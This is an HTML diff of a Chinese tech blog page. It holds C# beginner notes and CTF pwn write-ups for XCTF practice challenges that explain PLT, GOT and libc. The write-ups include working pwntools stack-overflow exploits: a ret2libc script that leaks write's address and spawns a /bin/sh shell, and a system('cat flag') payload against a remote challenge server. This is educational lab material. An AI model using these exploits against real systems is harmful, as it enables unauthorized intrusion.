 <td><strong>ToChar</strong> 如果可能的话，把类型转换为单个 Unicode 字符类型。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>4</td>
 <td><strong>ToDateTime</strong> 把类型（整数或字符串类型）转换为 日期-时间 结构。</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>5</td>
 <td><strong>ToDecimal</strong> 把浮点型或整数类型转换为十进制类型。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>6</td>
 <td><strong>ToDouble</strong> 把类型转换为双精度浮点型。</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>7</td>
 <td><strong>ToInt16</strong> 把类型转换为 16 位整数类型。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>8</td>
 <td><strong>ToInt32</strong> 把类型转换为 32 位整数类型。</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>9</td>
 <td><strong>ToInt64</strong> 把类型转换为 64 位整数类型。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>10</td>
 <td><strong>ToSbyte</strong> 把类型转换为有符号字节类型。</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>11</td>
 <td><strong>ToSingle</strong> 把类型转换为小浮点数类型。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>12</td>
 <td><strong>ToString</strong> 把类型转换为字符串类型。</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>13</td>
 <td><strong>ToType</strong> 把类型转换为指定类型。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>14</td>
 <td><strong>ToUInt16</strong> 把类型转换为 16 位无符号整数类型。</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>15</td>
 <td><strong>ToUInt32</strong> 把类型转换为 32 位无符号整数类型。</td>
 </tr>
-<tr>
+<tr class="even">
 <td>16</td>
 <td><strong>ToUInt64</strong> 把类型转换为 64 位无符号整数类型。</td>
 </tr>
-</tbody></table>
-<h1 id="第五课-C-遗产"><a href="#第五课-C-遗产" class="headerlink" title="第五课 C++遗产"></a>第五课 C++遗产</h1><h2 id="读入"><a href="#读入" class="headerlink" title="读入"></a>读入</h2><p><strong>System</strong> 命名空间中的 <strong>Console</strong> 类提供了一个函数 **ReadLine()**，用于接收来自用户的输入，并把它存储到一个变量中。</p>
+</tbody>
+</table>
+<h1 id="第五课-c遗产">第五课 C++遗产</h1>
+<h2 id="读入">读入</h2>
+<p><strong>System</strong> 命名空间中的 <strong>Console</strong> 类提供了一个函数 <strong>ReadLine()</strong>，用于接收来自用户的输入，并把它存储到一个变量中。</p>
 <p>例如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int num;</span><br><span class="line">num = Convert.ToInt32(Console.ReadLine());</span><br></pre></td></tr></table></figure>
-
 <p>函数 <strong>Convert.ToInt32()</strong> 把用户输入的数据转换为 int 数据类型，因为 <strong>Console.ReadLine()</strong> 只接受字符串格式的数据。</p>
-<h2 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h2><p>C# 也支持 foreach 循环，使用foreach可以迭代数组或者一个集合对象。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class ForEachTest</span><br><span class="line">&#123;</span><br><span class="line">    static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        int[] fibarray = new int[] &#123; 0, 1, 1, 2, 3, 5, 8, 13 &#125;;</span><br><span class="line">        foreach (int element in fibarray)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Console.WriteLine(element);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="foreach">foreach</h2>
+<p>C# 也支持 foreach 循环，使用foreach可以迭代数组或者一个集合对象。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class ForEachTest</span><br><span class="line">&#123;</span><br><span class="line">    static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        int[] fibarray = new int[] &#123; 0, 1, 1, 2, 3, 5, 8, 13 &#125;;</span><br><span class="line">        foreach (int element in fibarray)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Console.WriteLine(element);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>输出结果为： 0 1 1 2 3 5 8 13</p>
+<h1 id="第六课-封装">第六课 封装</h1>
+<p>public：所有对象都可以访问 private：对象本身在对象内部可以访问 protected：只有该类对象及其子类对象可以访问 internal：同一个程序集的对象可以访问 protected internal：访问限于当前程序集或派生自包含类的类型</p>
+<h1 id="第七课-数组">第七课 数组</h1>
 
-<p>输出结果为：<br>0<br>1<br>1<br>2<br>3<br>5<br>8<br>13</p>
-<h1 id="第六课-封装"><a href="#第六课-封装" class="headerlink" title="第六课 封装"></a>第六课 封装</h1><p>public：所有对象都可以访问<br>private：对象本身在对象内部可以访问<br>protected：只有该类对象及其子类对象可以访问<br>internal：同一个程序集的对象可以访问<br>protected internal：访问限于当前程序集或派生自包含类的类型</p>
-<h1 id="第七课-数组"><a href="#第七课-数组" class="headerlink" title="第七课 数组"></a>第七课 数组</h1>
       
     </div>
 
@@ -1192,28 +1203,29 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="滚出新手村"><a href="#滚出新手村" class="headerlink" title="滚出新手村"></a>滚出新手村</h1><p>这是xctf新手区pwn题最后一题</p>
+          <h1 id="滚出新手村">滚出新手村</h1>
+<p>这是xctf新手区pwn题最后一题</p>
 <p>革命尚未成功同志仍需努力（×）</p>
 <p>只要我出了新手村就算成功（√）</p>
-<h1 id="plt表、got表和libc"><a href="#plt表、got表和libc" class="headerlink" title="plt表、got表和libc"></a>plt表、got表和libc</h1><p>首先假定程序里有函数A，函数A的内容是调用printf函数。</p>
+<h1 id="plt表got表和libc">plt表、got表和libc</h1>
+<p>首先假定程序里有函数A，函数A的内容是调用printf函数。</p>
 <p>printf函数位于libc动态库内（系统内所以进程共享同一个动态库）。</p>
 <p>一个编译单元（例如一个.cpp文件）编译成一个或多个中间文件（.o），这些中间文件由汇编指令构成，但里面不会包含printf函数的具体地址，因为编译器不知道具体位置在哪，（只要不是在本文件内的地址都不知道），所以中间文件中本该有printf函数的地方（call ······）会由一个符号替代，这跟符号用于告诉链接器这里的地址需要修正。</p>
-<p>接下来链接器链接中间文件来形成可执行文件。过程中：需要确保不论需要修正的函数的地址是在另外一个中间文件中还是在libc中，程序都能工作。故链接器的工作模式为：<br>1.如果需要修正的函数的地址在.o文件中，链接文件，完成修正地址。<br>2.否则，链接器会生成一段可以获取printf函数在libc地址的代码段（也是一个函数），链接到这个函数上。故在这种情况下，只要在程序运行时才能真正确定printf函数的真正地址和printf函数执行内容的代码。</p>
+<p>接下来链接器链接中间文件来形成可执行文件。过程中：需要确保不论需要修正的函数的地址是在另外一个中间文件中还是在libc中，程序都能工作。故链接器的工作模式为： 1.如果需要修正的函数的地址在.o文件中，链接文件，完成修正地址。 2.否则，链接器会生成一段可以获取printf函数在libc地址的代码段（也是一个函数），链接到这个函数上。故在这种情况下，只要在程序运行时才能真正确定printf函数的真正地址和printf函数执行内容的代码。</p>
 <p>PLT表（Procedure Link Table）：就是上述链接器形成的代码段，由这些代码段构成的表。</p>
 <p>GOT表（Global Offset Table）:存放libc真正功能性代码的地址，由这些地址构成的表。</p>
 <p>libc动态库：存放自带的可调用的功能性函数。</p>
 <img src="/2021/03/27/AD-level3/1.jpg" class>
-
-<h1 id="新增python、pwntools内容"><a href="#新增python、pwntools内容" class="headerlink" title="新增python、pwntools内容"></a>新增python、pwntools内容</h1><p>相关内容已经更新在“pwn用到的工具汇总”</p>
-<h1 id="边学边做"><a href="#边学边做" class="headerlink" title="边学边做"></a>边学边做</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">63111</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3&quot;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got_addr)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>
-
-<p>现在程序执行到read函数中间<br>136个‘a’覆盖buf<br>再覆盖read函数中 存放母函数的ebp<br>接下来覆盖其返回地址为write_plt</p>
+<h1 id="新增pythonpwntools内容">新增python、pwntools内容</h1>
+<p>相关内容已经更新在“pwn用到的工具汇总”</p>
+<h1 id="边学边做">边学边做</h1>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">63111</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3&quot;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got_addr)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>
+<p>现在程序执行到read函数中间 136个‘a’覆盖buf 再覆盖read函数中 存放母函数的ebp 接下来覆盖其返回地址为write_plt</p>
 <p>程序执行到read函数的ret，清空栈内包括write_plt_addr之前的所有东西，跳转到write_plt_addr</p>
-<p>对于write_plt_addr<br>main_addr成了它的返回地址<br>1，write_got_addr，4，成了它的参数</p>
-<p>于是通过write_got_addr成功泄露了write_got，并返回main函数，用于其它操作。<br>即使这里main_addr改为其它地址，仍然成功能泄露write_got_addr。</p>
+<p>对于write_plt_addr main_addr成了它的返回地址 1，write_got_addr，4，成了它的参数</p>
+<p>于是通过write_got_addr成功泄露了write_got，并返回main函数，用于其它操作。 即使这里main_addr改为其它地址，仍然成功能泄露write_got_addr。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">63111</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3&quot;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got_addr)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got = u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc_base = write_got - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload2=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>p32()将数据打包成4位字节的其它形式，相应的u32只能解包4个字节的数据<br>libc中函数名地址可直接查出，但具体执行地址在哪执行不知道<br>通过libc中write的函数名地址和执行地址，算出相对偏移</p>
+<p>p32()将数据打包成4位字节的其它形式，相应的u32只能解包4个字节的数据 libc中函数名地址可直接查出，但具体执行地址在哪执行不知道 通过libc中write的函数名地址和执行地址，算出相对偏移</p>
 
       
     </div>
@@ -1281,12 +1293,11 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
           <p>这题和level2很像，都是溢出覆盖返回地址，进入system函数。（一些其它细节在同level2）</p>
 <p>但本题没有提供system函数所需的关键字符串，所以可以在输入其它变量时输入想要的字符串，例如：cat flag。找出这个变量的地址，用p32打包给system函数做参数。</p>
 <img src="/2021/03/26/AD-cgpwn2/1.png" class>
-
 <p>值得一提的是，本题有两个system函数，都可以用。</p>
 <img src="/2021/03/26/AD-cgpwn2/2.png" class>
 <img src="/2021/03/26/AD-cgpwn2/3.png" class>
-
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">35786</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;please tell me your name&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;hello,you can leave some message here:\n&quot;</span>)</span><br><span class="line">sys_add = <span class="number">0x08048420</span> <span class="comment"># 0x0804854D也行</span></span><br><span class="line">cmd_add = <span class="number">0x0804A080</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2A</span> + p32(sys_add) + p32(<span class="number">0</span>) + p32(cmd_add)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
       
     </div>
 
